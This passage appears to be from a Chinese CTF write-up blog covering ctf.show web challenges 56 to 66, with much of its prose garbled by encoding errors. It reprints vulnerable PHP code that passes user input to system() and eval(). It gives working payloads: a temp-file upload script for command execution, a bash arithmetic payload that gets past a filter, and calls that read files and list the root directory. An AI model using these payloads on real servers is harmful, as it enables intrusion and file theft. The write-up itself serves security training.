class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c7ab10d0-d6da-40f4-8e90-c56abda22ce1.challenge.ctf.show/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;. /???/????????[@-[]&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;.\\a.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: file&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = requests.post(url,params=payload,files=files)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&#x27; &#x27;</span>,flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>â€‹å¦å¤–è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ª a.txt æ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹ä¸º cat flag.php</p><h1 id="web57"><a class="markdownIt-Anchor" href="#web57">#</a> Web57ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªä¼¼ä¹å¯ä»¥å–ååšï¼š</p><blockquote><p>åœ¨ liunx ä¸­ï¼Œ$(()) ä¸º 0 , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(()))) ä¸º - 1 ~<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>ä»£è¡¨å–åï¼Œ</mtext><mn>0</mn><mtext>å–ååä¸º</mtext><mo>âˆ’</mo><mn>1</mn><mtext>ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆæ„é€ å‡º</mtext><mo>âˆ’</mo><mn>37</mn><mtext>ï¼Œå–ååå°±ä¸º</mtext><mn>36</mn><mtext>ï¼Œä¹Ÿå°±æ˜¯</mtext></mrow><annotation encoding="application/x-tex">ä»£è¡¨å–åï¼Œ0å–ååä¸º-1ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆæ„é€ å‡º-37ï¼Œå–ååå°±ä¸º36ï¼Œä¹Ÿå°±æ˜¯</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">ä»£</span><span class="mord cjk_fallback">è¡¨</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord">0</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ä¸º</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">æ ·</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">å…ˆ</span><span class="mord cjk_fallback">æ„</span><span class="mord cjk_fallback">é€ </span><span class="mord cjk_fallback">å‡º</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">7</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">ä¸º</span><span class="mord">3</span><span class="mord">6</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¹Ÿ</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">æ˜¯</span></span></span></span> (()) ä¸­æœ‰ 37 ä¸ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(()))) åœ¨åŠ ä¸Šå–åï¼Œä¹Ÿå°±æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext>Â </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak">Â </span></span></span></span>(()))) ä¸­æœ‰ 37 ä¸ª - 1</p></blockquote><p>â€‹å…ˆè´´ä¸€ä¸ªæ— å­—æ¯æ•°å­— RCE çš„æ€»ç»“ï¼š</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODEwNz90aW1lX18xMzExPW40JTJCeG5EMERjN0dRRHREa1dHT0RsaGplMCUzRDZBZ2doaXJPTW93aUQ=">æ— å­—æ¯æ•°å­— webshell æ€»ç»“</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjcwNjM0MDc/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJENjgxNDdERS1BRUIzLTRCMUUtQjEyRC03NjE5RTREQzEzNTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUQ2ODE0N0RFLUFFQjMtNEIxRS1CMTJELTc2MTlFNERDMTM1MSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTI3MDYzNDA3LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09bGludXglRTUlOEYlOTYlRTUlOEYlOEQlRTUlOTElQkQlRTQlQkIlQTRyY2UlRTglODQlOUElRTYlOUMlQUMmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">æ— æ•°å­—å­—æ¯ rce æ€»ç»“ï¼ˆå–åã€å¼‚æˆ–ã€è‡ªå¢ã€ä¸´æ—¶æ–‡ä»¶ï¼‰</span></p><p>â€‹å¯æƒœï¼Œåšé¢˜çš„è¿™ä¸ªè€ƒç‚¹ä¼¼ä¹è¿™ä¸¤ç¯‡æ–‡ç« é‡Œæ²¡æœ‰ï¼š</p><blockquote><p>åŒå°æ‹¬å· (()) æ˜¯ Bash Shell ä¸­ä¸“é—¨ç”¨æ¥è¿›è¡Œæ•´æ•°è¿ç®—çš„å‘½ä»¤ï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œå†™æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šè¿ç»´ä¸­å¸¸ç”¨çš„è¿ç®—å‘½ä»¤ã€‚ é€šä¿—åœ°è®²ï¼Œå°±æ˜¯å°†æ•°å­¦è¿ç®—è¡¨è¾¾å¼æ”¾åœ¨ ((å’Œ)) ä¹‹é—´ã€‚ è¡¨è¾¾å¼å¯ä»¥åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªï¼Œå¤šä¸ªè¡¨è¾¾å¼ä¹‹é—´ä»¥é€—å·ï¼Œåˆ†éš”ã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼çš„æƒ…å†µï¼Œä»¥æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚ å¯ä»¥ä½¿ç”¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>è·å–</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨</mtext></mrow><annotation encoding="application/x-tex">è·å– (( )) å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">å‘½</span><span class="mord cjk_fallback">ä»¤</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ç»“</span><span class="mord cjk_fallback">æœ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">å’Œ</span><span class="mord cjk_fallback">ä½¿</span><span class="mord cjk_fallback">ç”¨</span></span></span></span>è·å¾—å˜é‡å€¼æ˜¯ç±»ä¼¼çš„ã€‚ å¯ä»¥åœ¨ (()) å‰é¢åŠ ä¸Š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>ç¬¦å·è·å–</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥</mtext><mi>c</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">ç¬¦å·è·å– (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥ c=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">ç¬¦</span><span class="mord cjk_fallback">å·</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">å‘½</span><span class="mord cjk_fallback">ä»¤</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ‰§</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">ç»“</span><span class="mord cjk_fallback">æœ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¹Ÿ</span><span class="mord cjk_fallback">å³</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">æ•´</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">è¡¨</span><span class="mord cjk_fallback">è¾¾</span><span class="mord cjk_fallback">å¼</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å€¼</span><span class="mord cjk_fallback">ã€‚</span><span class="mord cjk_fallback">ä»¥</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>((a+b)) ä¸ºä¾‹ï¼Œå³å°† a+b è¿™ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœèµ‹å€¼ç»™å˜é‡ cã€‚ æ³¨æ„ï¼Œç±»ä¼¼ c=((a+b)) è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œä¸åŠ  $ å°±ä¸èƒ½å–å¾—è¡¨è¾¾å¼çš„ç»“æœã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #è¿”å›ä¸Šä¸€æ¬¡çš„æ‰§è¡Œç»“æœ`</span><br><span class="line">echo $(()) #0</span><br><span class="line">echo $((~$(()))) #~0æ˜¯-1</span><br><span class="line">$(($((~$(())))$((~$(()))))) #$((-1-1))å³$$((-2))æ˜¯-2</span><br><span class="line">echo $((~-37)) #~-37æ˜¯36</span><br></pre></td></tr></table></figure><p>â€‹æ‰€ä»¥ payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">$</span>((~<span class="built_in">$</span>((<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))))))</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬ç”Ÿæˆç®€å•çš„æ•°å­—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num_1 = <span class="string">&quot;$((~$(())))&quot;</span></span><br><span class="line">inta = <span class="number">36</span></span><br><span class="line">resp = <span class="string">&quot;$((~$((&quot;</span>+ num_1 * <span class="number">37</span>  +<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure><h1 id="web58"><a class="markdownIt-Anchor" href="#web58">#</a> Web58ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ä¹ä¸€çœ‹ï¼Œå¥½åƒå¾ˆç®€å•ï¼Œä¸è¿‡ï¼Œå½“æˆ‘ post äº†ä¸€ä¸ª phpinfo ä¹‹åï¼Œå‘ç°äº†å‡½æ•°è¢«ç¦äº†ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: phpinfo() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure><p>â€‹å»ºè®®ç›´æ¥ fuzz ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“å“ªäº›è¢« ban äº†ï¼Œè¿™é‡Œå°±ç›´æ¥ show_source äº†ï¼š</p><blockquote><p>c=show_source(â€˜flag.phpâ€™);<br>c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h1 id="web59"><a class="markdownIt-Anchor" href="#web59">#</a> Web59ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹å…·ä½“ä¸çŸ¥é“æœ‰äº›å•¥è¢« ban äº†ï¼Œåªèƒ½ä¸€ä¸ªä¸ªæµ‹ï¼Œç»“æœå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œshow_source ä¾æ—§è¿‡äº†ï¼š</p><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web60"><a class="markdownIt-Anchor" href="#web60">#</a> Web60ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®ï¼š</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸€æ¨¡ä¸€æ ·ï¼Œç›´æ¥ç»™ paylaodï¼š</p><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web61"><a class="markdownIt-Anchor" href="#web61">#</a> Web61ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹show_source ç™¾è¯•ä¸çˆ½å•Šã€‚</p><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web62"><a class="markdownIt-Anchor" href="#web62">#</a> Web62ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web63"><a class="markdownIt-Anchor" href="#web63">#</a> Web63ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web64"><a class="markdownIt-Anchor" href="#web64">#</a> Web64ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web65"><a class="markdownIt-Anchor" href="#web65">#</a> Web65ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(â€œflag.phpâ€);</p></blockquote><h1 id="web66"><a class="markdownIt-Anchor" href="#web66">#</a> Web66ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹show_source å‡½æ•°è¢« ban äº†ï¼Œhighlight_file æ²¡æœ‰è¢« banï¼Œè¯•è¯•çœ‹ï¼Œç»“æœ flag æ²¡æœ‰åœ¨ flag.php é‡Œï¼Œé€šè¿‡å¦‚ä¸‹ payload å‘ç° flag åœ¨æ ¹ç›®å½•ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span 